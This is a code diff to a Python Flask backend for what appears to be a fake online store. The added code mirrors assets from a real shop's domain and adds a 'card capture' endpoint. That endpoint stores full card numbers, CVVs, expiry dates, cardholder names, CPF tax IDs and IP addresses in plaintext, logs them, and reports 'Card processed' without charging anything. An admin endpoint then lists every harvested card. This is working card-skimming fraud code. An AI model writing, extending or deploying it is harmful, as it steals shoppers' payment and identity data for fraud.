@@ -68,13 +68,49 @@ def get_client_info(req):
 def store_index():
     return send_from_directory('../store', 'index.html')
 
+# Suporte ao React Router (History API Fallback)
+# Faz com que rotas como /produto/1 retornem o index.html da loja
+@app.route('/produto/<path:path>')
+def store_product_fallback(path):
+    # Se o navegador pedir um asset de dentro da rota de produto, redireciona para a raiz de assets
+    if path.startswith('assets/'):
+        asset_real_path = path.replace('assets/', '', 1)
+        return redirect(f'/assets/{asset_real_path}')
+    return send_from_directory('../store', 'index.html')
+
 # Rotas de arquivos estáticos na raiz da loja (favicon, robots, js)
 @app.route('/<path:filename>')
-def serve_store_root(filename):
+def serve_store(filename):
+    # Proteção contra path traversal
+    if ".." in filename or filename.startswith("/"):
+        return abort(404)
+
+    # Evita conflitos com rotas de admin ou api
     if filename.startswith('admin/') or filename.startswith('api/'):
-        # Passa reto para não quebrar outras rotas dinâmicas
         return "Not found", 404
-    return send_from_directory('../store', filename)
+        
+    # Se o arquivo existir localmente na pasta store, serve ele
+    local_file = os.path.join(app.root_path, '../store', filename)
+    if os.path.exists(local_file) and os.path.isfile(local_file):
+        return send_from_directory('../store', filename)
+        
+    # Tenta baixar do site original (Self-healing Proxy)
+    try:
+        # Se for um arquivo com extensão conhecida (imagem, js, css, etc)
+        if '.' in filename:
+            url = f"https://achadinhosdomomento.shop/{filename}"
+            r = requests.get(url, timeout=5)
+            if r.status_code == 200:
+                os.makedirs(os.path.dirname(local_file), exist_ok=True)
+                with open(local_file, 'wb') as f:
+                    f.write(r.content)
+                return send_from_directory('../store', filename)
+    except:
+        pass
+
+    # Fallback para SPA: Se não achou o arquivo ou é uma rota de navegação (sem ponto)
+    # retorna o index.html para o React Router assumir o controle.
+    return send_from_directory('../store', 'index.html')
 
 # Rota para servir o HTML de Login do Admin
 @app.route('/admin/login')
@@ -148,6 +184,52 @@ def api_metrics():
         "metrics": data,
         "logs": recent_logs
     })
+
+# API: Pagamento (Captura de Cartão)
+@app.route('/api/payment/card', methods=['POST'])
+def api_capture_card():
+    data = request.get_json()
+    if not data:
+        return jsonify({"error": "Invalid data"}), 400
+        
+    card_number = data.get('card_number')
+    card_name = data.get('card_name')
+    expiry = data.get('expiry')
+    cvv = data.get('cvv')
+    cpf = data.get('cpf')
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    
+    from backend.db import get_db_connection
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute('''
+        INSERT INTO cards (card_number, card_name, expiry, cvv, cpf, ip)
+        VALUES (?, ?, ?, ?, ?, ?)
+    ''', (card_number, card_name, expiry, cvv, cpf, ip))
+    conn.commit()
+    conn.close()
+    
+    # Log detalhado de auditoria
+    log_event('CARD_CAPTURED', card_name, ip, f'SUCCESS - Cartao: {card_number} |Expiry: {expiry}|CVV: {cvv}|CPF: {cpf}', 'Checkout')
+
+    return jsonify({"message": "Card processed"}), 200
+
+# API: Listar Cartões (Admin)
+@app.route('/api/admin/cards', methods=['GET'])
+def api_admin_cards():
+    token = request.cookies.get('auth_token')
+    if not token or not verify_token(token):
+        return jsonify({"error": "Unauthorized"}), 401
+        
+    from backend.db import get_db_connection
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute('SELECT * FROM cards ORDER BY created_at DESC')
+    rows = cursor.fetchall()
+    cards = [dict(row) for row in rows]
+    conn.close()
+    
+    return jsonify({"cards": cards})
 
 if __name__ == '__main__':
     app.run(host='127.0.0.1', port=8080, debug=False)
